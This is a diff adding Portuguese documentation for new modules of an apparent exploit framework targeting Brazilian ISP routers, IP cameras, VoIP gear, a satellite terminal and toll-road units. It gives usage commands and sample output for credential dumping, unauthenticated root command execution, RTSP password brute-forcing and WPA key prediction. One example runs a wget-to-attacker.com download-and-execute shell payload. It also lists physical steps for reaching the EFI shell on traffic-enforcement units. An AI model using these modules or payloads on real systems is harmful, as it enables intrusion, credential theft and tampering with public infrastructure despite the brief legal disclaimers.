@@ -219,6 +219,275 @@ embedxpl/
 | UTStarcom | Disclosure de credenciais PPPoE via `ppppassword.html` |
 | Zoom | X4/X5 criação de admin via `PopOutUserAdd.htm` (EDB-26736) |
 
+## Novos Modulos - Batch BLOCO v2.0
+
+Esta secao documenta os modulos adicionados no batch de expansao BLOCO K, L, D, H, N e I.
+
+---
+
+### BLOCO K - Dispositivos ISP Brasileiros
+
+Exploits e scanners voltados para CPEs e cameras IP comumente distribuidas por provedores de internet brasileiros (Claro, Vivo, TIM, OI, Algar e equipamentos baseados em Sercomm).
+
+| Dispositivo | CVE | Caminho do Modulo | Tipo de Ataque |
+|-------------|-----|-------------------|----------------|
+| TP-Link TL-SC3171 / SC4171 / SC4171G | CVE-2013-2573 | `exploits/cameras/tplink/tl_sc_series_cmd_inject_cve_2013_2573` | Injecao de Comando (sem auth) |
+| TP-Link TL-SC3171 / SC3130 | CVE-2013-2581 | `exploits/cameras/tplink/tl_sc_series_unauth_firmware_upload_cve_2013_2581` | Upload de Firmware sem Autenticacao |
+| D-Link DCS-932L | CVE-2026-36983 | `exploits/cameras/dlink/dcs_932l_light_sensor_rce_cve_2026_36983` | RCE via Sensor de Luz |
+| D-Link DCS-932L | CVE-2025-5573 | `exploits/cameras/dlink/dcs_932l_admin_cmd_inject_cve_2025_5573` | Injecao de Comando no Painel Admin |
+| D-Link DCS-933L | CVE-2026-2218 | `exploits/cameras/dlink/dcs_933l_admin_cmd_inject_cve_2026_2218` | Injecao de Comando no Painel Admin |
+| ZTE ZXHN H267N / H268N | CVE-2026-34473 | `exploits/routers/zte/zxhn_h267n_h268n_dos_cve_2026_34473` | Negacao de Servico |
+| ZTE ZXHN H298A / H108N | CVE-2026-34474 | `exploits/routers/zte/zxhn_h298a_cred_dump_cve_2026_34474` | Dump de Credenciais (ETHCheat) |
+| Intelbras IWR roteadores | - | `exploits/routers/intelbras/iwr_luci_rpc_rce` | RCE via LuCI RPC sem Autenticacao |
+| Scanner multi-vendor ISP BR | - | `scanners/specialized/br_isp_scanner` | Descoberta ativa + verificacao de vuln |
+
+**Exemplos de uso:**
+
+```bash
+# ZTE ZXHN H298A - Dump de Credenciais
+embedxpl use routers/zte/zxhn_h298a_cred_dump_cve_2026_34474
+embedxpl (ZXHNCred) > set rhost 192.168.1.1
+embedxpl (ZXHNCred) > run
+
+# Saida esperada (dispositivo vulneravel):
+[+] Conectado em 192.168.1.1:80
+[+] Enviando requisicao ETHCheat: GET /getpage.lua?pid=1000&ETHCheat=1
+[!] VULNERAVEL: Credenciais expostas
+    Senha Admin: admin123
+    WPA PSK: MinhaWifi
+    SSID: ZTE_Router_ABC
+
+# Saida (nao vulneravel):
+[-] Nenhum campo de credencial encontrado na resposta
+[-] Alvo pode estar corrigido ou com firmware diferente
+```
+
+```bash
+# Intelbras IWR LuCI RPC RCE
+embedxpl use routers/intelbras/iwr_luci_rpc_rce
+embedxpl (IWRLuci) > set rhost 192.168.0.1
+embedxpl (IWRLuci) > set cmd "id"
+embedxpl (IWRLuci) > run
+
+# Saida esperada:
+[+] Endpoint LuCI RPC encontrado em /cgi-bin/luci/rpc/sys
+[+] RCE via sys.exec: uid=0(root) gid=0(root)
+```
+
+```bash
+# Scanner de ISPs brasileiros multi-vendor
+embedxpl use scanners/specialized/br_isp_scanner
+embedxpl (BRISPScan) > set target 192.168.0.0/24
+embedxpl (BRISPScan) > run
+```
+
+**Notas:** CVE-2026-34474 afeta ZTE ZXHN H298A 1.1 e H108N 2.6. Sem autenticacao necessaria.
+**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.
+
+---
+
+### BLOCO L - Portes RouterPWN
+
+Exploits classicos e modernos do catalogo RouterPWN portados para o formato de modulo EmbedXPL-Forge.
+
+| Dispositivo | CVE / Referencia | Caminho do Modulo | Tipo de Ataque |
+|-------------|-----------------|-------------------|----------------|
+| Cobham Aviator 700 SATCOM | CVE-2014-2943 | `exploits/specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943` | Reset de Senha Admin (sem auth) |
+| Huawei HG8245H | - | `osint/keygen/huawei_hg8245_wpa_keygen` | Gerador de Chave WPA Padrao |
+| Alcatel-Lucent OmniPCX Enterprise | - | `exploits/voip/alcatel_lucent/omnipcx_enterprise_mastercgi_rce` | RCE via masterCGI sem autenticacao |
+| Linksys E-Series (The Moon) | EDB-31683 | `exploits/routers/linksys/eseries_themoon_rce_tmunblock` | RCE via tmUnblock.cgi |
+| NETGEAR DGN2200 | EDB-24665 | `exploits/routers/netgear/dgn2200_open_telnetd_rce` | RCE via open-telnetd sem auth |
+| Siemens FlexiISN | - | `exploits/routers/siemens/flexiisn_auth_bypass` | Bypass de Autenticacao |
+| Thomson BTHomeHub | - | `exploits/routers/thomson/bthomehub_voice_hijack` | Sequestro de Configuracao VoIP |
+| AT&T 2Wire Gateway | - | `exploits/routers/two_wire/atandt_gateway_crlf_dos` | Injecao CRLF / DoS |
+
+**Exemplos de uso:**
+
+```bash
+# Reset admin Cobham Aviator (terminal VSAT / Satelite)
+embedxpl use specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943
+embedxpl (CobhamReset) > set rhost 192.168.1.1
+embedxpl (CobhamReset) > run
+
+# Saida esperada:
+[+] Conectado na interface Cobham Aviator 700
+[+] Enviando requisicao de reset admin sem autenticacao
+[!] VULNERAVEL: Senha admin redefinida para padrao
+
+# Linksys eSeries The Moon RCE
+embedxpl use routers/linksys/eseries_themoon_rce_tmunblock
+embedxpl (TheMoon) > set rhost 192.168.1.1
+embedxpl (TheMoon) > set cmd "busybox wget http://attacker.com/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh"
+embedxpl (TheMoon) > run
+
+# Gerador de chave WPA Huawei HG8245H
+embedxpl use osint/keygen/huawei_hg8245_wpa_keygen
+embedxpl (HuaweiKeygen) > set ssid "HG8245H-ABCDEF"
+embedxpl (HuaweiKeygen) > run
+# Saida: [+] Chave WPA prevista: xA7z3k9P
+```
+
+**Notas:** The Moon worm (CVE Linksys E-Series) explora tmUnblock.cgi sem autenticacao em firmwares < 2.0.08.
+**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.
+
+---
+
+### BLOCO D - Framework de Cliente RTSP
+
+Biblioteca Python RFC 2326 RTSP/1.0 pura que serve como base para todos os modulos de ataque a cameras RTSP.
+
+**Modulo:** `network/rtsp/rtsp_client.py` - classe `RTSPClient`
+
+**Funcionalidades:**
+- Metodos OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN
+- Autenticacao Basic e Digest (RFC 2617)
+- Parsing de descricao de sessao SDP
+- Gerenciamento de timeout e reconexao automatica
+- Suporte a context manager (`with RTSPClient(...) as client`)
+
+**Exemplo de uso:**
+
+```bash
+# Uso direto via API Python
+python3 -c "
+from embedxpl.modules.network.rtsp.rtsp_client import RTSPClient
+with RTSPClient('192.168.1.10', 554, timeout=5) as client:
+    resp = client.describe('/live/ch0')
+    if resp.status_code == 200:
+        sdp = client.parse_sdp(resp.body)
+        print(f'Streams: {[s.media_type for s in sdp.streams]}')
+"
+```
+
+```bash
+# Brute force de credenciais RTSP (usa RTSPClient internamente)
+embedxpl use network/rtsp/rtsp_cred_brute
+embedxpl (RTSPBrute) > set rhost 192.168.1.10
+embedxpl (RTSPBrute) > set rport 554
+embedxpl (RTSPBrute) > set path /live/ch0
+embedxpl (RTSPBrute) > run
+
+# Saida esperada:
+[+] Tentando admin:admin ... 401 Unauthorized
+[+] Tentando admin:12345 ... 200 OK
+[!] VALIDO: admin:12345
+```
+
+**Requisitos:** Python 3.8+, sem dependencias externas.
+
+---
+
+### BLOCO H - Consulta FCC-ID
+
+Modulo OSINT que consulta o banco de dados de autorizacao de equipamentos da FCC para recuperar detalhes do dispositivo a partir de codigos FCC-ID encontrados em etiquetas fisicas.
+
+**Modulo:** `osint/fcc_id_lookup.py`
+
+**Exemplo de uso:**
+
+```bash
+embedxpl use osint/fcc_id_lookup
+embedxpl (FCCLookup) > set fcc_id "PD5-WNR3500U"
+embedxpl (FCCLookup) > run
+
+# Saida esperada:
+[+] FCC ID: PD5-WNR3500U
+    Fabricante: NETGEAR Inc.
+    Produto: WNR3500U Wireless-N Gigabit Router
+    Frequencia: 2.4GHz / 5GHz
+    Autorizacao: OET-65C
+    Laboratorio: SGS
+    Data de Aprovacao: 2009-11-18
+    Fotos Internas: [URL]
+    Fotos Externas: [URL]
+    Relatorio de Teste: [URL]
+```
+
+**Dicas:**
+- FCC IDs estao impressos nas etiquetas do dispositivo (formato: `CODIGO_GRANTEE-CODIGO_PRODUTO`)
+- Util para identificar hardware OEM, base de firmware ou cadeia de fornecedores
+- Combine com `osint/github_recon` para encontrar repositorios de firmware publicos
+
+**Requisitos:** Acesso a internet, biblioteca `requests`.
+
+---
+
+### BLOCO N - Gerador de URL de Camera iSpy
+
+Gera URLs de stream conhecidas com base no fabricante, modelo e versao de firmware, usando o formato do banco de dados de cameras iSpy.
+
+**Modulo:** `osint/camera_url_generator.py`
+
+**Exemplo de uso:**
+
+```bash
+embedxpl use osint/camera_url_generator
+embedxpl (CameraURL) > set vendor "hikvision"
+embedxpl (CameraURL) > set model "DS-2CD2143G2"
+embedxpl (CameraURL) > run
+
+# Saida esperada:
+[+] URLs de stream conhecidas para Hikvision DS-2CD2143G2:
+    [1] rtsp://<ip>:554/Streaming/Channels/101
+    [2] rtsp://<ip>:554/Streaming/Channels/102
+    [3] rtsp://<ip>:554/h264/ch1/main/av_stream
+    [4] http://<ip>/ISAPI/Streaming/channels/1/picture
+    [5] http://<ip>/onvif/device_service
+
+# Gerar wordlist para brute force RTSP
+embedxpl (CameraURL) > set output_file /tmp/hikvision_routes.txt
+embedxpl (CameraURL) > run
+```
+
+**Dicas:**
+- Combine com `network/rtsp/rtsp_route_brute` para enumerar streams ativos
+- Suporta 300+ fabricantes de cameras do banco de dados iSpy
+- Use `set all_vendors true` para exportar todas as URLs conhecidas
+
+---
+
+### BLOCO I - Modulos de Fiscalizacao de Transito
+
+Modulos voltados para infraestrutura de fiscalizacao de transito (RSUs de pedagio eletronico, radares, cameras ANPR).
+
+#### Kapsch TrafficCom RSU EFI Shell (CVE-2025-25734)
+
+**Modulo:** `exploits/specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734`
+
+**Vulnerabilidade:** Road-Side Units (RSUs) da Kapsch utilizadas em sistemas de pedagio eletronico carecem de enforces de UEFI Secure Boot e senha de BIOS, permitindo que atacantes com acesso fisico acessem o shell EFI interativo e o sistema de arquivos completo.
+
+**Impacto:** Extracao de configuracao, roubo de chaves TLS privadas, instalacao de implantes, bypass da funcionalidade de fiscalizacao.
+
+**Exemplo de uso:**
+
+```bash
+# Verificacao de alcance de rede (deteccao de interface de gerenciamento)
+embedxpl use specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734
+embedxpl (KapschRSU) > set rhost 10.0.0.50
+embedxpl (KapschRSU) > check
+
+# Saida esperada (interface de gerenciamento exposta):
+[+] Interface de gerenciamento Kapsch RSU detectada em 10.0.0.50:80
+[!] Indicador de banner: 'TrafficCom RSU' encontrado
+[*] NOTA: Exploracao completa requer acesso fisico presencial
+
+# Relatorio de avaliacao
+embedxpl (KapschRSU) > run
+# Gera: passos de ataque, checklist de mitigacoes, nivel de risco
+```
+
+**Passos de exploracao fisica:**
+1. Abrir o gabinete RSU (parafusos anti-violacao)
+2. Conectar teclado USB e monitor na placa-mae do RSU
+3. Reiniciar - pressionar ESC/DEL/F2 durante o POST
+4. Navegar: Boot Manager -> EFI Internal Shell
+5. Acessar sistema de arquivos: `fs0:\efi\config\` para extracao de configuracao
+
+**Requisitos:** Acesso fisico ao hardware RSU (monitor + teclado USB), ou acesso de rede a interface de gerenciamento para deteccao de banner.
+**Legal:** Acesso nao autorizado a infraestrutura de fiscalizacao de transito e crime. Use apenas em equipamentos de sua propriedade ou com autorizacao escrita expressa para avaliacao de segurança.
+
+---
+
 ## Arquitetura do Framework (v3.1.0)
 
 ### Arquitetura de Componentes
